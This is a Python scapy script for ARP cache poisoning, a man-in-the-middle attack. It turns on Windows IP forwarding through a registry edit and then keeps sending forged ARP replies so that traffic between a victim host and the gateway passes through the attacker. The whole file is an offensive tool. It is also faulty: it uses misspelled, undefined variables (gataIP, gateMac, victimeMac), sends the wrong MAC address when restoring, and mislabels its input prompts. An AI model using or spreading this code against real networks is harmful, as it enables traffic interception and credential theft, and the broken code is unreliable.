from scapy.all import *
import sys
import os
import time

try:
	interface = input("    interface name: ")
	victimeIP = input("    your ip: ")
	gateIP = input("    target ip: ")
	victimeMAC = input("    your MAC Address: ")
	gateMAC = input("    target MAC Address: ")
except KeyboardInterrupt:
	print("[!] User Requested Shutdown!")
	print("[!] Exiting...")
	sys.exit(1)

print("[^] Enabling IP forwarding...")
os.system('pwsh -Command Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -Name IPEnableRouter -Value "1"')



def reARP():
	print("[^] Restoring Targets...")
	
	
	send(ARP(op=2, pdst=gataIP, psrc=victimeIP, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victimeMAC),count=7)
	send(ARP(op=2, pdst=victimeIP, psrc=gataIP, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=victimeMAC),count=7)
	print("[^] Disabling IP forwarding...")
	os.system('pwsh -Command Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -Name IPEnableRouter -Value "0"')
	print("[^] Shutting Down...")
	sys.exit(1)


def trick(gm,vm):
    send(ARP(op=2,pdst=victimeIP,psrc=gateIP,hwdst=gm))
    send(ARP(op=2,pdst=gateIP,psrc=victimeIP,hwdst=vm))
    
def mitm():
    print("[^] Poisoning Targets...")
    while True:
    	try:
        	trick(gateMac,victimeMac)
        	time.sleep(1.5)
    	except KeyboardInterrupt:
        	reARP()
        	break
        
        
mitm()
